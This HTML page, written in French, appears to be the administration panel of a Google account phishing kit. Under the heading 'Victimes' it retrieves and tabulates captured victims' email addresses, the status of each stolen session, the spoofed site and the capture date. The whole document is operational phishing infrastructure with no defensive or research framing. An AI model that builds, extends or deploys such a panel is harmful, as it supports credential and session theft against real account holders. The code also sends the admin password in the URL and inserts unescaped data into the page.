<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin - Google Auth Kit</title>
<style>
body{font-family:system-ui,sans-serif;background:#111;color:#fff;padding:20px}
table{width:100%;border-collapse:collapse;margin-top:20px}
th,td{text-align:left;padding:10px;border-bottom:1px solid #333}
th{background:#222;color:#999;font-size:12px;text-transform:uppercase}
tr:hover{background:#1a1a1a}
.status-active{color:#4ade80}.status-captured{color:#fb923c}.status-error{color:#ef4444}
input{background:#222;border:1px solid #444;color:#fff;padding:8px 12px;border-radius:4px}
button{background:#2563eb;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer}
</style>
</head>
<body>
<h1>Victimes</h1>
<div style="margin-bottom:16px">
  <input type="password" id="pwd" placeholder="Mot de passe admin">
  <button onclick="load()">Charger</button>
</div>
<table id="tbl" style="display:none">
  <tr><th>Email</th><th>Status</th><th>Site</th><th>Date</th></tr>
</table>
<script>
var api=location.origin;
function load(){
  var p=document.getElementById('pwd').value;
  fetch(api+'/api/victims?password='+encodeURIComponent(p))
    .then(r=>r.json()).then(d=>{
      if(!d.success){alert(d.error);return;}
      var t=document.getElementById('tbl');t.style.display='table';
      t.innerHTML='<tr><th>Email</th><th>Status</th><th>Site</th><th>Date</th></tr>';
      d.victims.forEach(v=>{
        var s=v.status||'inconnu';
        var cls=s==='session_active'?'status-active':(s.includes('error')?'status-error':'status-captured');
        t.innerHTML+='<tr><td>'+(v.email||'-')+'</td><td class="'+cls+'">'+s+'</td><td>'+(v.site_name||'-')+'</td><td>'+(v.created_at?new Date(v.created_at).toLocaleString():'-')+'</td></tr>';
      });
    });
}
</script>
</body>
</html>
